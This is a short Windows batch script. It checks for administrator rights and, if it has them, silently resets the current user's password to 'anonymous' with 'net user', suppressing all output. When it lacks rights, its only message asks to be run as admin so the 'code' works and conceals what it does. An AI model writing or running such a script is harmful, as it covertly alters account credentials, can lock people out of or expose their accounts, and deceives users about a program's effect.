@echo off
setlocal enabledelayedexpansion
net session >nul 2>&1
	if %errorlevel% equ 0 (
		REM Echo you are running with admin previleg
		rem pause >nul
		net user %USERNAME% anonymous >nul
	) else (
		echo.
		echo you need to run as admin in order to make this code
		echo executed correctly.
		timeout /t 5 /NOBREAK
	)
	